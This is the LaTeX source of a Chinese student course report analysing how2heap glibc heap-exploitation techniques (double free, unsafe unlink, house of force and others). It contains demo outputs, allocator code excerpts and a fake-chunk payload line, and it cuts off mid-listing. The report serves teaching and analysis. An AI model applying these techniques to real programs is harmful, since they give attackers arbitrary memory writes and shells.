\documentclass{article}
\usepackage[utf8]{inputenc}
\usepackage{xeCJK}
\usepackage{indentfirst}
\usepackage{minted}
\usepackage{url}
\usepackage{geometry}
\geometry{a4paper,left=2cm,right=2cm,top=3cm,bottom=2cm}

\title{软件安全与漏洞分析大作业-I}

\author{LIU Jin\\
15180110082 \\
liujin.xdu@pm.me \and
YANG Chao\\
15180110110 \\
firmianay@gmail.com \and
LI Yiding\\
15180120028 \\
drimtuer@gmail.com \and
WANG Xu\\
15130120190 \\
codeklaus@gmail.com
}

\begin{document}
\maketitle

% STEEINGS
\renewcommand{\contentsname}{目录}
% \renewcommand{\bibname}{参考文献}

% 目录
\newpage
\tableofcontents
\newpage

\begin{center}
    \section{引言}
\end{center}

% 添加首行缩进,两个字符
\setlength{\parindent}{2em}

 \LaTeX 真好用。
 
 首先,我们在glibc版本是2.23的Ubuntu系统上编译了\verb+ how2heap+中的案例,分析了\verb+ how2heap+中的堆利用手段,然后分别在Glibc-2.27版本和jemalloc-5.0.1版本中分析了上述攻击手段成功或失败的原因,最后列举了一下在写大作业中的坑。
 
 这部分内容前前后后写了一个月,于是就老老实实当了一个多月的ptmalloc拳击手。

\newpage
% Section 2 analysis how2heap
% \begin{center}
    \section{how2heap 分析}
\end{center}

% 添加首行缩进,两个字符
\setlength{\parindent}{2em}
堆是程序虚拟地址空间中的一块连续的区域,与栈不同,由低地址向高地址增长,且由操作系统进行维护。

编译 \verb+how2heap+ 的机器\verb+libc+版本如下:
\begin{minted}[breaklines, frame=lines]{shell}
$ file /lib/x86_64-linux-gnu/libc-2.23.so
/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5381a457906d279073822a5ceb24c4bfef94ddb, for GNU/Linux 2.6.32, stripped
\end{minted}

\subsection{first\_fit}
\setlength{\parindent}{2em}

运行之,结果如下:

\begin{minted}[breaklines, frame=lines]{bash}
$  how2heap git:(master) ✗ ./first_fit

This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.
glibc uses a first-fit algorithm to select a free chunk.
If a chunk is free and large enough, malloc will select this chunk.
This can be exploited in a use-after-free situation.
Allocating 2 buffers. They can be large, don't have to be fastbin.
1st malloc(512): 0x1768010
2nd malloc(256): 0x1768220
we could continue mallocing here...
now let's put a string at a that we can read later "this is A!"
first allocation 0x1768010 points to this is A!
Freeing the first one...
We don't need to free anything again. As long as we allocate less than 512, it will end up at 0x1768010
So, let's allocate 500 bytes
3rd malloc(500): 0x1768010
And put a different string here, "this is C!"
3rd allocation 0x1768010 points to this is C!
first allocation 0x1768010 points to this is C!
\end{minted}

这里,第一个程序展示了 \verb+ glibc+ 堆分配的策略,即 \verb+ first-fit+。在分配内存时,\verb+ malloc+ 会先到 \verb+ unsorted bin+(或者\verb+ fastbins+) 中查找适合的被\verb+ free+的\verb+ chunk+,如果没有,就会把\verb+ unsorted bin+中的所有\verb+ chunk+分别放入到所属的\verb+ bins+中,然后再去这些\verb+ bins+里去找合适的 \verb+ chunk+。可以看到第三次\verb+ malloc+的地址和第一次相同,即\verb+ malloc+找到了第一次\verb+ free+掉的\verb+ chunk+,并把它重新分配。


\subsection{fastbin\_dup}

运行得到结果:
\begin{minted}[breaklines, frame=lines]{bash}
$  how2heap git:(master) ✗ ./fastbin_dup

This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0xb3b010
2nd malloc(8): 0xb3b030
3rd malloc(8): 0xb3b050
Freeing the first one...
If we free 0xb3b010 again, things will crash because 0xb3b010 is at the top of the free list.
So, instead, we'll free 0xb3b030.
Now, we can free 0xb3b010 again, since it's not the head of the free list.
Now the free list has [ 0xb3b010, 0xb3b030, 0xb3b010 ]. If we malloc 3 times, we'll get 0xb3b010 twice!
1st malloc(8): 0xb3b010
2nd malloc(8): 0xb3b030
3rd malloc(8): 0xb3b010
\end{minted}

这个程序展示了利用\verb+ fastbins+的\verb+ double-free+攻击,可以泄漏出一块已经被分配的内存指针\verb+ fastbins+可以看成一个后进先出的栈,使用单链表实现,通过\verb+ fastbin->fd+来遍历\verb+ fastbins+。由于\verb+ free+的过程会对\verb+ free list+ 做检查,我们不能连续两次\verb+ free+同一个\verb+ chunk+,所以这里在两次\verb+ free+ 之间,增加了一次对其他\verb+ chunk+的\verb+ free+过程,从而绕过检查顺利执行。然后再\verb+ malloc+三次,就在同一个地址\verb+ malloc+了两次,也就有了两个指向同一块内存区域的指针。

\subsection{fastbin\_dup\_into\_stack}

首先,我们在\verb+ malloc.c+中可以找到\verb+ malloc_chunk+的定义如下:

\begin{minted}[breaklines, frame=lines]{c}
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
};
\end{minted}

上面这个程序展示了怎样通过修改\verb+ fd+指针,将其指向一个伪造的\verb+ free chunk+,在伪造的地址处\verb+ malloc+出一个\verb+ chunk+。
该程序大部分内容都和上一个程序一样,漏洞也同样是\verb+ double-free+,只有给\verb+ fd+填充的内容不一样。

\subsection{unsafe\_unlink}

上面这个程序展示了怎样利用\verb+ free+改写全局指针\verb+ chunk0_ptr+达到任意内存写的目的,即\verb+ unsafe unlink+。

我们可以 Google 搜索到\verb+ unlink+函数的具体实现:
\begin{minted}[breaklines, frame=lines]{c}
   #define unlink( P, BK, FD ) {            \
       BK = P->bk;                          \
       FD = P->fd;                          \
       FD->bk = BK;                         \
       BK->fd = FD;                         \
   }
\end{minted}

但是这个\verb+ unlink+的实现属于旧版本的\verb+ glibc+,我们编译机器上的\verb+ glibc+中的\verb+ unlink+的实现如下,增加了一些对\verb+ unsafe unlink+的检查,也是我们需要绕过的检查:
\begin{minted}[breaklines, frame=lines]{c}
    /* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {
    FD = P->fd;
    BK = P->bk;
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) malloc_printerr(check_action, "corrupted double-linked list", P, AV);
    else {
        FD->bk = BK;
        BK->fd = FD;
        if (!in_smallbin_range (P->size) && __builtin_expect (P->fd_nextsize != NULL, 0)) {
        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)
        || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))
         malloc_printerr (check_action, "corrupted double-linked list (not small)", P, AV);
            if (FD->fd_nextsize == NULL) {
                  FD->fd_nextsize = FD->bk_nextsize = FD;
                else {
                    FD->fd_nextsize = P->fd_nextsize;
                    FD->bk_nextsize = P->bk_nextsize;
                    P->fd_nextsize->bk_nextsize = FD;
                    P->bk_nextsize->fd_nextsize = FD;
                  }
              } else {
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;
              }
          }
      }
}
\end{minted}

编译并运行:
\begin{minted}[breaklines, frame=lines]{bash}
$ gcc -g unsafe_unlink.c 
$ ./a.out 
The global chunk0_ptr is at 0x601070, pointing to 0x721010
The victim chunk we are going to corrupt is at 0x7210a0

Fake chunk fd: 0x601058
Fake chunk bk: 0x601060

Original value: AAAAAAAA
New Value: BBBBBBBB
\end{minted}

上述代码中,使用\verb+ int malloc_size = 0x80;+的目的在于不使用操作系统分配的\verb+ fastbins+, 而去申请使用\verb+ small bins+, 然后, 我们使\verb+ header_size+的大小为\verb+ 2+。接着,我们申请两块空间,全局指针\verb+ chunk0_ptr+指向堆块\verb+ chunk0+,局部指针\verb+ chunk1_ptr+指向\verb+ chunk1+。

如果我们想要绕过\verb+ (P->fd->bk != P || P->bk->fd != P) == False;+ 的检查,但是这个检查有个缺陷,就是\verb+ fd/bk+指针都是通过与\verb+ chunk+ 头部的相对地址来查找的。所以我们可以利用全局指针\verb+ chunk0_ptr+构造一个\verb+fake chunk+来绕过它。

我们在\verb+ chunk0+里构造一个\verb+ fake chunk+,用\verb+ P+表示,两个指针\verb+ fd+和\verb+ bk+可以构成两条链:\verb+ P->fd->bk == + \\ \verb+ P,P->bk->fd == P;+,可以绕过检查。另外利用\verb+ chunk0+ 的溢出漏洞,通过修改\verb+ chunk1+ 的\verb+ prev_size+为\verb+ fake chunk+的大小,修改\verb+ PREV_INUSE+标志位为\verb+ 0+,将\verb+ fake chunk+伪造成一个\verb+ free chunk+。

接下来就是释放掉\verb+ chunk1+,这会触发\verb+ fake chunk+的\verb+  unlink+并覆盖\verb+chunk0_ptr+的值。

由于\verb+ unlink+ 的操作是:
\begin{minted}[breaklines, frame=lines]{c}
FD = P->fd;
BK = P->bk;
FD->bk = BK
BK->fd = FD
\end{minted}

由于这时候\verb+ P->fd->bk+和\verb+ P->bk->fd+都指向\verb+ P+,所以最后的结果为:
\begin{minted}[breaklines, frame=lines]{c}
chunk0_ptr = P = P->fd;
\end{minted}
因此我们利用\verb+ ublink+成功的修改了\verb+ chunk0_ptr+,即这时\verb+ chunk0_ptr[0]+和\verb+ chunk0_ptr[3]+实际上就是同一东西。所以我们修改\verb+ chunk0_ptr[3]+实际上就是在修改\verb+ chunk0_ptr[0]+。

\begin{minted}[breaklines, frame=lines]{c}
chunk0_ptr[3] = (uint64_t) victim_string;
fprintf(stderr, "Original value: %s\n", victim_string);
chunk0_ptr[0] = 0x4242424242424242LL;
fprintf(stderr, "New Value: %s\n", victim_string);
\end{minted}

此时,\verb+ chunk0_ptr+指向了\verb+ victim_string+,因此,我们修改\verb+ chunk0_ptr[3]+,就可以修改\verb+ victim_string+。通过上述演示,我们成功的利用\verb+ unsafe_unlink+做到了修改任意地址,但是上述演示仅在老版本的\verb+ glibc+(版本小于等于2.26)中可以演示成功,因为新版本的\verb+ glibc+中添加了对单字节溢出问题的检查:
\begin{minted}[breaklines, frame=lines]{c}
chunk_size == next-> prev-> chunk_size;
\end{minted}
,以及新增加的\verb+ tcache+机制:
\begin{minted}[breaklines, frame=lines]{c}
#if USE_TCACHE
/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */
# define TCACHE_MAX_BINS               64
# define MAX_TCACHE_SIZE       tidx2usize (TCACHE_MAX_BINS-1)

/* Only used to pre-fill the tunables.  */
# define tidx2usize(idx)       (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)

/* When "x" is from chunksize().  */
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
/* When "x" is a user-provided size.  */
# define usize2tidx(x) csize2tidx (request2size (x))

/* With rounding and alignment, the bins are...
   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)
   idx 1   bytes 25..40 or 13..20
   idx 2   bytes 41..56 or 21..28
   etc.  */

/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7
#endif
\end{minted}

有关\verb+ tcache+机制的代码可以在这个网站\footnote{https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc}中查看更多。

\verb+ tcache+机制是一种线程缓存机制,每个线程默认情况下有 64 个大小递增的\verb+ bins+,每个\verb+ bin+是一个单链表,默认最多包含 7 个\verb+ chunk+。其中缓存的\verb+ chunk+是不会被合并的,所以在释放\verb+ chunk 1+的时候,\verb+ chunk0_ptr+仍然指向正确的堆地址,而不是\verb+ chunk0_ptr = P = P->fd;+。对于如何在代码中绕过\verb+ tcache+机制,仍然有很多可行的办法,其中一种是,我们可以在源程序的代码中添加一些代码,给填充进特定大小的\verb+ chunk+把\verb+ bin+占满,然后就能绕过\verb+ tcache+机制,在高版本\verb+ glibc+中实现和老版本相同的效果。

\subsection{unsorted\_bin\_attack}

编译运行之,得到结果:
\begin{minted}[breaklines, frame=lines]{c}
$ gcc -g unsorted_bin_attack.c 
$ ./a.out 
The target we want to rewrite on stack: 0x7ffc9b1d61b0 -> 0

Now, we allocate first small chunk on the heap at: 0x1066010
We free the first chunk now. Its bk pointer point to 0x7f2404cf5b78
We write it with the target address-0x10: 0x7ffc9b1d61a0

Let's malloc again to get the chunk we just free: 0x7ffc9b1d61b0 -> 0x7f2404cf5b78
\end{minted}

\verb+ unsorted_bin_attack+通常情况下是为了更进一步的利用所做的铺垫,我们已经知道\verb+ unsorted bin+是一个双向链表,在分配时会通过\verb+ unlink+操作将\verb+ chunk+从链表中移除,所以如果能够控制\verb+ unsorted bin chunk+的\verb+ bk+指针,就可以向任意位置写入一个指针。

这里通过\verb+ unlink+将\verb+ libc+的信息写入到我们可控的内存中,从而导致信息泄漏,为进一步的攻击提供便利,如泄露了\verb+ libc+的某些函数的地址,如果我们通过其他方式获取到了\verb+ libc+的版本信息,就可以通过偏移算出其他函数的地址,可以绕过 ASLR的保护。

\subsection{house\_of\_spirit}

编译运行之,结果如下:
\begin{minted}[breaklines, frame=lines]{bash}
$ gcc -g house_of_spirit.c 
$ ./a.out 
We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.
The first one:  0x7ffc782dae00
The second one: 0x7ffc782dae20
Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7ffc782dae00.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffc782dae00, which will be 0x7ffc782dae10!
malloc(0x10): 0x7ffc782dae10
\end{minted}

\verb+ house-of-spirit+是一种对\verb+ fastbins+的攻击方法,即通过构造\verb+ fake chunk+,然后将其\verb+ free+掉,就可以在下一次\verb+ malloc+时返回\verb+ fake chunk+的地址,即一段我们可控的区域。其中,使用\verb+ house-of-spirit+技术的条件一是要使\verb+ free+的参数可控,以便指向我们想要控制的地址,其二是想要控制的地址我们应有写权限,以便提前伪造\verb+ fake chunk+。另外,这种攻击手段既可以利用堆溢出搞事情,也可以利用栈溢出搞事情。

具体的使用流程是,先在想要控制的地址上连续伪造\verb+ chunk+,由于堆的检查机制,我们需要连续伪造两个\verb+ chunk+,比如利用如下\verb+ Python+代码\footnote{Python代码中的函数为Python的漏洞利用框架pwntools中的函数,可访问官网:https://github.com/Gallopsled/pwntools}:
\begin{minted}[breaklines, frame=lines]{python}
l32(0x0)+l32(41)+'AAAA'*8 +l32(0x0)+l32(41)
\end{minted}

然后,我们控制\verb+ free+的参数,指向我们伪造的\verb+ chunk+地址,如果我们此时再次\verb+ free+,就可以控制之前伪造\verb+ chunk+的内存了。

\subsection{house\_of\_orange}

编译运行之,得到:
% , fontsize=\tiny
\begin{minted}[breaklines, frame=lines, fontsize=\small]{c}
$ gcc house_of_orange -o house_of_orange
$ ./house_of_orange
*** Error in `./house_of_orange': malloc(): memory corruption: 0x00007f82acdf5520 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f82acaa77e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f82acab213e]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f82acab4184]
./house_of_orange[0x4006cc]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f82aca50830]
./house_of_orange[0x400509]
======= Memory map: ========
00400000-00401000 r-xp 00000000 00:00 39375                      /mnt/c/Users/SKYE/Desktop/how2heap/house_of_orange
00600000-00601000 r--p 00000000 00:00 39375                      /mnt/c/Users/SKYE/Desktop/how2heap/house_of_orange
00601000-00602000 rw-p 00001000 00:00 39375                      /mnt/c/Users/SKYE/Desktop/how2heap/house_of_orange
01c98000-01cdb000 rw-p 00000000 00:00 0                          [heap]
7f82a8000000-7f82a8021000 rw-p 00000000 00:00 0
7f82a8021000-7f82ac000000 ---p 00000000 00:00 0
7f82ac810000-7f82ac826000 r-xp 00000000 00:00 208780             /lib/x86_64-linux-gnu/libgcc_s.so.1
7f82ac826000-7f82aca25000 ---p 00000016 00:00 208780             /lib/x86_64-linux-gnu/libgcc_s.so.1
7f82aca25000-7f82aca26000 rw-p 00015000 00:00 208780             /lib/x86_64-linux-gnu/libgcc_s.so.1
7f82aca30000-7f82acbf0000 r-xp 00000000 00:00 85962              /lib/x86_64-linux-gnu/libc-2.23.so
7f82acbf0000-7f82acbf9000 ---p 001c0000 00:00 85962              /lib/x86_64-linux-gnu/libc-2.23.so
7f82acbf9000-7f82acdf0000 ---p 000001c9 00:00 85962              /lib/x86_64-linux-gnu/libc-2.23.so
7f82acdf0000-7f82acdf4000 r--p 001c0000 00:00 85962              /lib/x86_64-linux-gnu/libc-2.23.so
7f82acdf4000-7f82acdf6000 rw-p 001c4000 00:00 85962              /lib/x86_64-linux-gnu/libc-2.23.so
7f82acdf6000-7f82acdfa000 rw-p 00000000 00:00 0
7f82ace00000-7f82ace25000 r-xp 00000000 00:00 85960              /lib/x86_64-linux-gnu/ld-2.23.so
7f82ace25000-7f82ace26000 r-xp 00025000 00:00 85960              /lib/x86_64-linux-gnu/ld-2.23.so
7f82ad025000-7f82ad026000 r--p 00025000 00:00 85960              /lib/x86_64-linux-gnu/ld-2.23.so
7f82ad026000-7f82ad027000 rw-p 00026000 00:00 85960              /lib/x86_64-linux-gnu/ld-2.23.so
7f82ad027000-7f82ad028000 rw-p 00000000 00:00 0
7f82ad200000-7f82ad201000 rw-p 00000000 00:00 0
7f82ad210000-7f82ad211000 rw-p 00000000 00:00 0
7f82ad220000-7f82ad221000 rw-p 00000000 00:00 0
7f82ad230000-7f82ad231000 rw-p 00000000 00:00 0
7fffee362000-7fffeeb62000 rw-p 00000000 00:00 0                  [stack]
7fffef2a7000-7fffef2a8000 r-xp 00000000 00:00 0                  [vdso]
$ whoami
skye
$ exit
[1]    69 abort (core dumped)  ./house_of_orange
\end{minted}

\verb+ house_of_orange+s是一种堆溢出修改\verb+ _IO_list_all+指针的利用方法。我们可以利用这个方法来泄露堆信息和\verb+ libc+的相关信息。我们已经知道,但程序还未申请内存时,整个堆块都属于\verb+ top chunk+,每次申请内存时,操作系统就从\verb+ top chunk+中划出请求大小的堆块返回给用户,于是\verb+ top chunk+就会越来越小。

这时候,如果我们再次申请内存,但是\verb+ top chunk+的剩余大小已经不能满足请求,此时操作系统调用\verb+ sysmalloc()+函数分配新的堆空间,这时候有两种选择,一种是直接扩充\verb+ top chunk+,另一种是调用\verb+ mmap()+分配一块新的\verb+ top chunk+。

\verb+ _IO_list_all+是一个\verb+ _IO_FILE_plus+类型的对象,我们的目的就是将\verb+ _IO_list_all+ 指针改写为一个伪造的指针,它的\verb+ _IO_OVERFLOW+指向\verb+ system+,并且前 8 字节被设置为\verb+ '/bin/sh'+,所以对\verb+ _IO_OVERFLOW(fp, EOF)+的调用会变成对\verb+ system('/bin/sh')+的调用。

\subsection{house\_of\_lore}

编译,运行得到结果:

\begin{minted}[breaklines, frame=lines]{c}
$ gcc -g house_of_lore.c 
$ ./a.out 
Allocated the victim (small) chunk: 0x1b2e010
stack_buffer_1: 0x7ffe5c570350
stack_buffer_2: 0x7ffe5c570330

Freeing the victim chunk 0x1b2e010, it will be inserted in the unsorted bin
victim->fd: 0x7f239d4c9b78
victim->bk: 0x7f239d4c9b78

Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x1b2e0c0
The victim chunk 0x1b2e010 will be inserted in front of the SmallBin
victim->fd: 0x7f239d4c9bf8
victim->bk: 0x7f239d4c9bf8

Now emulating a vulnerability that can overwrite the victim->bk pointer
This last malloc should return a chunk at the position injected in bin->bk: 0x7ffe5c570360
The fd pointer of stack_buffer_2 has changed: 0x7f239d4c9bf8

Nice jump d00d
\end{minted}

\verb+ the_house_of_lore+的原理是通过破坏已经放入\verb+ small bins+ 中的\verb+ bk+指针来达到取得任意地址的目的。当程序申请的内存大小符合\verb+ small bins+,则堆管理器在对应的\verb+ bin+中寻找是否有大小符合且空闲的块,如果有,那么进行\verb+ unlink+操作,将内存交给程序。

那么,当一个块存在于 Small Bin 的第一个块时,通过溢出修改其\verb+ bk+指针指向某个地址\verb+ ptr+, 当下一次进行\verb+ malloc+对应大小的块时, 就有\verb+ bck = victim->bk= ptr+, 且 \verb+ bin->bk = bck = ptr+, 这样以来就成功地将这个\verb+ bin+的第一块指向了\verb+ ptr+, 下次再\verb+ malloc+对应大小就能够返回\verb| ptr+16|的位置, 这样攻击者再对取回的块进行写入就能控制\verb$ ptr+16$的内存内容。

\subsection{house\_of\_einherjar}

编译,运行得到结果:
\begin{minted}[breaklines, frame=lines]{bash}
$ gcc -g house_of_einherjar.c 
$ ./a.out 
We allocate 0x10 bytes for 'a': 0xb31010

Our fake chunk at 0x7ffdb337b7f0 looks like:
prev_size: 0x80
size: 0x80
fwd: 0x7ffdb337b7f0
bck: 0x7ffdb337b7f0
fwd_nextsize: 0x7ffdb337b7f0
bck_nextsize: 0x7ffdb337b7f0

We allocate 0xf8 bytes for 'b': 0xb31030
b.size: 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0xb31020 - 0x7ffdb337b7f0 = 0xffff80024d7b5830

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk
Our fake chunk size is now 0xffff80024d7d6811 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk: 0x7ffdb337b800
\end{minted}

\verb+ house-of-einherjar+是一种利用\verb+ malloc+ 来返回一个附近地址的任意指针。它要求有一个单字节溢出漏洞,覆盖掉\verb+ next chunk+的\verb+ size+字段并清除\verb+ PREV_IN_USE+标志,然后还需要覆盖\verb+ prev_size+字段为\verb+ fake chunk+的大小。
当\verb+ next chunk+被释放时,它会发现前一个\verb+ chunk+被标记为空闲状态,然后尝试合并堆块。只要我们精心构造一个\verb+ fake chunk+,并让合并后的堆块范围到\verb+ fake chunk+处,那下一次\verb+ malloc+将返回我们想要的地址。

\subsection{house\_of\_force}

编译,运行,得到结果:
\begin{minted}[breaklines, frame=lines]{bash}
$ gcc -g house_of_force.c
$ ./a.out 
We will overwrite a variable at 0x601080

Let's allocate the first chunk of 0x10 bytes: 0x824010.
Real size of our allocated chunk is 0x18.

Overwriting the top chunk size with a big value so the malloc will never call mmap.
Old size of top chunk: 0x20fe1
New size of top chunk: 0xffffffffffffffff

The value we want to write to at 0x601080, and the top chunk is at 0x824028, so accounting for the header size, we will malloc 0xffffffffffddd048 bytes.
As expected, the new pointer is at the same place as the old top chunk: 0x824030
malloc(0x30) => 0x601080!

Now, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.
old string: This is a string that we want to overwrite.
new string: YEAH!!!
\end{minted}

\verb+ house_of_force+是一种通过改写\verb+ top chunk+的\verb+ size+字段来欺骗堆分配器的返回任意地址的技术。我们知道在空闲内存的最高处,必然存在一块空闲的\verb+ chunk+,即\verb+ top chunk+,当\verb+ bins+和\verb+ fast bins+ 都不能满足分配需要的时候,\verb+ malloc+会从\verb+ top chunk+中分出一块内存给用户。所以\verb+ top chunk+的大小会随着分配和回收不停地变化。

这种攻击假设有一个溢出漏洞,可以改写\verb+ top chunk+的头部,然后将其改为一个非常大的值,以确保所有的\verb+ malloc+将使用\verb+ top chunk+ 分配,而不会调用\verb+ mmap+。这时如果攻击者\verb+ malloc+一个很大的数目(负有符号整数),\verb+ top chunk+ 的位置加上这个大数,造成整数溢出,结果是\verb+ top chunk+ 能够被转移到堆之前的内存地址(如程序的 .bss 段、.data 段、GOT 表等),下次再执行\verb+ malloc+ 时,攻击者就能够控制转移之后地址处的内存。

\subsection{poison\_null\_byte}

编译,并运行得到结果:
\begin{minted}[breaklines, frame=lines]{c}
$ gcc -g poison_null_byte.c 
$ ./a.out 
We allocate 0x10 bytes for 'a': 0xabb010
'real' size of 'a': 0x18
b: 0xabb030
c: 0xabb140
b.size: 0x111 ((0x100 + 0x10) | prev_in_use)

After free(b), c.prev_size: 0x110
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

Pass the check: chunksize(P) == 0x100 == 0x100 == prev_size (next_chunk(P))
We malloc 'b1': 0xabb030
c.prev_size: 0x110
fake c.prev_size: 0x70

We malloc 'b2', our 'victim' chunk: 0xabb0c0
Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2': 0xabb030

b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
New b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\end{minted}

此技术的利用条件是某个由\verb+malloc +分配的内存区域存在单字节溢出,通过溢出下一个\verb+chunk +的\verb+size +字段,攻击者能够在堆中创造出重叠的内存块,从而达到改写其他数据的目的。再结合其他的利用方式,同样能够获得程序的控制权。

\subsection{overlapping\_chunks}

编译,运行得到结果:
\begin{minted}[breaklines, frame=lines]{bash}
$ gcc -g overlapping_chunks.c
$ ./a.out 
Now we allocate 3 chunks on the heap
p1=0x1e2b010
p2=0x1e2b0a0
p3=0x1e2b130

Freeing the chunk p2
Emulating an overflow that can overwrite the size of the chunk p2.

p4: 0x1e2b0a0 ~ 0x1e2b8e0
p3: 0x1e2b130 ~ 0x1e2b530

If we memset(p4, 'B', 0xd0), we have:
p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAa�
p3 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa�

If we memset(p3, 'C', 0x50), we have:
p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCC
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAa�
p3 = CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa�
\end{minted}

此项技术是通过一个溢出漏洞,改写\verb+unsorted bin +中空闲堆块的 size,改变下一次\verb+malloc +可以返回的堆块大小。

\subsection{overlapping\_chunks\_2}

编译,运行得到结果:
\begin{minted}[breaklines, frame=lines]{bash}
$ gcc -g overlapping_chunks_2.c
$ ./a.out 
Now we allocate 5 chunks on the heap

chunk p1: 0x18c2010 ~ 0x18c2028
chunk p2: 0x18c2030 ~ 0x18c20b8
chunk p3: 0x18c20c0 ~ 0x18c2148
chunk p4: 0x18c2150 ~ 0x18c21d8
chunk p5: 0x18c21e0 ~ 0x18c21f8

Let's free the chunk p4

Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)

Allocating a new chunk 6: 0x18c2030 ~ 0x18c21d8

Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)
p3 before = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
p3 after  = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
\end{minted}

与 overlapping\_chunks 不同的是,此技术在\verb+ free+之前修改\verb+ size+值,使\verb+ free+错误地修改了下一个\verb+ chunk+的\verb+ prev_size+值,导致中间的\verb+ chunk+强行合并。
\newpage


% Section 3 ptmalloc
% \begin{center}
    \section{ptmalloc 分析}
\end{center}

\setlength{\parindent}{2em}
此处分析的版本为glibc-2.27中的\verb+malloc+实现。

下载glibc-2.27源码,并编译glibc,单独使用如下命令编译每个文件,将动态链接库替换为我们刚编译好的glibc-2.27:
\begin{minted}[breaklines, frame=lines]{bash}
$  how2heap git:(master) ✗ gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 unsafe_unlink.c -o unsafe 

$  how2heap git:(master) ✗ ldd unsafe 
    linux-vdso.so.1 =>  (0x00007fffa0a78000)
    libc.so.6 => /root/tmpwork/g227/lib/libc.so.6 (0x00007f98aea71000)
    /root/tmpwork/g227/lib/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f98aee26000)
\end{minted}

\subsection{unsafe\_unlink}
依然使用之前的代码,只不过我们此次将glibc替换为glibc-2.27,此后的操作均相同:
\begin{minted}[breaklines, frame=lines]{bash}
